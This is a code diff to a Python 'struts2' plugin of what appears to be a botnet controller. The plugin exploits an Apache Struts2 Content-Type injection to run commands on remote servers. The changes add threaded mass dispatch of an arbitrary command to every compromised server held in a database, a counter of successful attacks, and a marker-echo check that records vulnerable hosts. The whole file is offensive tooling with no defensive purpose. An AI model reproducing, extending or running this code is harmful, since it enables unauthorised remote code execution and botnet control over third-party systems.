@@ -1,6 +1,7 @@
 # -*- coding: utf-8 -*-
 
 import os
+import time
 import requests
 from threading import Thread
 from plugins.database import database
@@ -9,6 +10,7 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 class struts2:
     def __init__(self,):
+        self.totalAttacks = 0
         self.db = database()
 
     def total(self,):
@@ -16,16 +18,24 @@ class struts2:
         return len(total)
 
     def sendBotnet(self,cmd,url):
-        if '065cd1ad45f099350c3b3404ca65761a0f6626eb' in self.exploit(url,'echo "065cd1ad45f099350c3b3404ca65761a0f6626eb"'):
-            self.exploit(url,cmd).strip()
-            self.totalAttacks += 1
+        verify = self.exploit(url,'echo "065cd1ad45f099350c3b3404ca65761a0f6626eb"')
+        if verify:
+            if '065cd1ad45f099350c3b3404ca65761a0f6626eb' in verify:
+                self.exploit(url,cmd)
+                self.totalAttacks = self.totalAttacks + 1
+            else:
+                print 'Did not find the string test: %s' %url
+        else:
+            print 'Maybe its not vulnerable anymore: %s' %url
 
     def botnet(self,cmd):
-        self.totalAttacks = 0
+        threads = []
         for server in self.db(self.db.servers.id > 0).select():
             t1 = Thread(target=self.sendBotnet, args=(cmd,server.url))
+            threads.append(t1)
             t1.start()
-            t1.join()
+        for thread in threads:
+            thread.join()
         return self.totalAttacks
 
     def list(self,):
@@ -38,11 +48,15 @@ class struts2:
         if self.db(self.db.servers.url == url).select().first():
             return 'InDB'
         else:
-            if '065cd1ad45f099350c3b3404ca65761a0f6626eb' in self.exploit(url,'echo "065cd1ad45f099350c3b3404ca65761a0f6626eb"'):
-                self.db = database()
-                self.db.servers.insert(url=url)
-                self.db.commit()
-                return True
+            verify = self.exploit(url,'echo "065cd1ad45f099350c3b3404ca65761a0f6626eb"')
+            if verify:
+                if '065cd1ad45f099350c3b3404ca65761a0f6626eb' in verify:
+                    self.db = database()
+                    self.db.servers.insert(url=url)
+                    self.db.commit()
+                    return True
+                else:
+                    return False
             else:
                 return False
 
@@ -66,7 +80,7 @@ class struts2:
         payload += "(#ros.flush())}"
         try:
             headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
-            r = requests.get(url, headers=headers,verify=False,timeout=15,stream=True)
+            r = requests.get(url, headers=headers,verify=False,timeout=10,stream=True)
             response = r.content
         except Exception as e:
             response = False
